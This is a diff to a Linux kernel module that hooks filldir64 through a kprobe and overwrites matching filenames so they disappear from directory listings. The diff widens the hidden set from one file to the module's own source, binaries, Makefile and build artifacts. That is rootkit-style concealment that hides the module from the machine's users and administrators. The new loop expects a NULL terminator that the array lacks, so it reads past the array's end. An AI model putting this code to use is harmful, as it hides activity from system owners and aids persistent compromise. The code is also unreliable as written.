@@ -5,7 +5,6 @@
  */
 
 #define pr_fmt(fmt) "%s: " fmt, __func__
-#define HIDE "hide.txt"
 
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -17,6 +16,12 @@
 #define dbg_print(fmt, ...) /* No-op */
 #endif
 
+static const char *files_to_hide[] = {
+	"file_hide",	   "file_hide.c",     "file_hide.ko", "file_hide.mod",
+	"file_hide.mod.c", "file_hide.mod.o", "file_hide.o",  "Makefile",
+	"modules.order",   "Module.symvers",
+};
+
 /* For each probe you need to allocate a kprobe structure */
 static struct kprobe kp = {
 	.symbol_name = "filldir64",
@@ -26,13 +31,18 @@ static struct kprobe kp = {
 static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
 	char *filename = (char *)regs->si;
+	const char **file;
 
 	dbg_print(
 		"<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
 		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si,
 		regs->flags);
-	if (strcmp(filename, HIDE) == 0)
-		strcpy((char *)regs->si, "\x00");
+	for (file = files_to_hide; *file != NULL; file++) {
+		if (strcmp(filename, *file) == 0) {
+			dbg_print("Hiding file: %s\n", filename);
+			strcpy((char *)regs->si, "\x00");
+		}
+	}
 
 	return 0;
 }
